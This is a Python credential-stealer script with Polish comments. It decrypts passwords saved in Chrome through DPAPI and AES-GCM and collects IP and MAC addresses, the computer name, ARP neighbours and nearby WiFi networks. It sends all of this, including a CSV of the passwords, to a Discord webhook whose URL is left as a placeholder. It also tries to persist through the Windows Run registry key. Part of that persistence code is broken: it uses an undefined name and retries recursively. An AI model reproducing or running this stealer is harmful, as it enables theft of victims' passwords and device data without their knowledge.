import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import csv
import requests
import platform
import uuid
import tempfile
import socket
import subprocess
import re
import ctypes
import sys
import winreg

# Funkcja do pobierania sekretnego klucza z przeglądarki Chrome
def get_secret_key():
    try:
        with open(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State'), 'r', encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            secret_key = secret_key[5:]  # Usuń prefix DPAPI
            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
            return secret_key
    except Exception as e:
        return None

# Funkcja do odszyfrowywania hasła
def decrypt_password(ciphertext, secret_key):
    try:
        init_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:]
        cipher = AES.new(secret_key, AES.MODE_GCM, init_vector)
        decrypted_password = cipher.decrypt(encrypted_password)
        return decrypted_password.rstrip(b'\x00').decode('utf-8', errors='ignore')
    except Exception as e:
        return ""

# Funkcja do uzyskiwania połączenia z bazą danych haseł Chrome
def get_db_connection(chrome_path_login_db):
    try:
        shutil.copy2(chrome_path_login_db, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        return None

# Funkcja do uzyskiwania zewnętrznego adresu IPv4
def get_external_ipv4_address():
    try:
        response = requests.get('https://api64.ipify.org?format=json')
        if response.status_code == 200:
            external_ip = response.json()['ip']
            return external_ip
        else:
            return None
    except Exception as e:
        return None

# Funkcja do uzyskiwania adresu IPv6
def get_ipv6_address():
    try:
        ipv6_address = socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET6)[0][4][0]
        return ipv6_address
    except Exception as e:
        return None

# Funkcja do uzyskiwania adresu MAC
def get_mac_address():
    try:
        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2 * 6, 2)][::-1])

        return mac_address
    except Exception as e:
        return None

# Funkcja do uzyskiwania nazwy komputera
def get_computer_name():
    try:
        computer_name = platform.node()

        return computer_name
    except Exception as e:
        return None

# Funkcja do uzyskiwania informacji o połączonych urządzeniach
def get_connected_devices():
    try:
        result = subprocess.run(['arp', '-a'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output = result.stdout
        devices = []
        lines = output.split('\n')
        for line in lines:
            if re.match(r'\d+\.\d+\.\d+\.\d+', line):
                parts = re.split(r'\s+', line)
                if len(parts) >= 3:
                    ip_address = parts[0]
                    mac_address = parts[1]
                    devices.append({"IP Address": ip_address, "MAC Address": mac_address})
        return devices
    except Exception as e:
        return []

# Funkcja do uzyskiwania informacji o dostępnych sieciach WiFi
def get_wifi_networks():
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'network'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output = result.stdout
        networks = []
        lines = output.split('\n')
        network_info = {}
        for line in lines:
            if re.match(r'\s+SSID \d+ :', line):
                if network_info:
                    networks.append(network_info)
                network_info = {}
            elif network_info and re.match(r'\s+\S+ \S+', line):
                parts = re.split(r':', line)
                if len(parts) == 2:
                    key = parts[0].strip()
                    value = parts[1].strip()
                    network_info[key] = value
        if network_info:
            networks.append(network_info)
        return networks
    except Exception as e:
        return []

if __name__ == '__main__':
    try:
        # Utwórz tymczasowy katalog do przechowywania plików
        temp_dir = tempfile.mkdtemp()

        # Utwórz plik CSV do przechowywania odszyfrowanych haseł
        csv_file_path = os.path.join(temp_dir, 'odszyfrowane_hasla.csv')
        with open(csv_file_path, mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',', escapechar='\\')
            csv_writer.writerow(["Index", "URL", "username", "password + random symbols (to don't get ban on discord)"])

            # Pobierz sekretny klucz z Chrome
            secret_key = get_secret_key()

            # Szukaj profilu użytkownika lub folderu domyślnego (tu jest przechowywane zaszyfrowane hasło do logowania)
            chrome_folders = [element for element in os.listdir(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data')) if re.search("^Profile*|^Default$", element) is not None]
            for folder in chrome_folders:
                # Pobierz ścieżkę do bazy danych logowania Chrome
                chrome_path_login_db = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', folder, 'Login Data')
                conn = get_db_connection(chrome_path_login_db)
                if secret_key and conn:
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index, login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if url and username and ciphertext:
                            # Odszyfruj hasło
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            # Zapisz odszyfrowane hasło do pliku CSV
                            csv_writer.writerow([index, url.encode('utf-8'), username.encode('utf-8'), decrypted_password.encode('utf-8')])
                    # Zamknij połączenie z bazą danych
                    cursor.close()
                    conn.close()
                    # Usuń tymczasową bazę danych logowania
                    os.remove("Loginvault.db")

        # Pobierz dane z Discord webhooka
        external_ipv4_address = get_external_ipv4_address()
        ipv6_address = get_ipv6_address()
        mac_address = get_mac_address()
        computer_name = get_computer_name()
        if external_ipv4_address and ipv6_address and mac_address and computer_name:
            data = {
                "content": f"IPv4: {external_ipv4_address}\n"
                           f"IPv6: {ipv6_address}\n"
                           f"MAC: {mac_address}\n"
                           f"PC Name: {computer_name}"
            }

            # Wyślij dane na Discord webhook
            webhook_url = 'WEBHOOK_URL'
            response = requests.post(webhook_url, json=data)

            # Wyślij plik CSV jako załącznik
            files = {'file': open(csv_file_path, 'rb')}
            response = requests.post(webhook_url, files=files)

        # Pobierz informacje o połączonych urządzeniach
        connected_devices = get_connected_devices()
        if connected_devices:
            data = {
                "content": "Connected devices:\n" + json.dumps(connected_devices, indent=4)
            }

            # Wyślij dane na Discord webhook
            response = requests.post(webhook_url, json=data)

        # Pobierz informacje o dostępnych sieciach WiFi
        wifi_networks = get_wifi_networks()
        if wifi_networks:
            data = {
                "content": "WiFi:\n" + json.dumps(wifi_networks, indent=4)
            }

            # Wyślij dane na Discord webhook
            response = requests.post(webhook_url, json=data)

        def add_to_startup():
            key = r"Software\Microsoft\Windows\CurrentVersion\Run"
            try:
                reg = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
                key = winreg.OpenKey(reg, key, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, os.path.abspath(sys.argv[0]))
                winreg.CloseKey(key)
            except Exception as e:

                add_to_startup()
            finally:
                shutil.rmtree(temp_dir, ignore_errors=True)

        add_to_startup()

    except Exception as e:
        print(f"ERROR {str(e)}")
